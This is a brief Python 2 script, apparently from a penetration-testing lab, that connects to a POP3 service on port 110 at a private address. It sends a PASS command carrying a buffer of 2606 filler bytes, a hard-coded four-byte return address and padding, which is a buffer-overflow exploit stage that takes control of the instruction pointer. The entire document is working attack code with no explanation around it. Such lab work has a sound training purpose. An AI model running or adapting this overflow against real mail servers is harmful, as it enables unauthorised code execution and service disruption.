#!/usr/bin/python

import socket

#Create array of buffers

buffer="A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * (4000-2610)


print "Fussing %s characters " % len(buffer)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.178.76', 110))
s.recv(1024)
s.send("USER test\r\n")
s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.send('QUIT\r\n')
s.close()
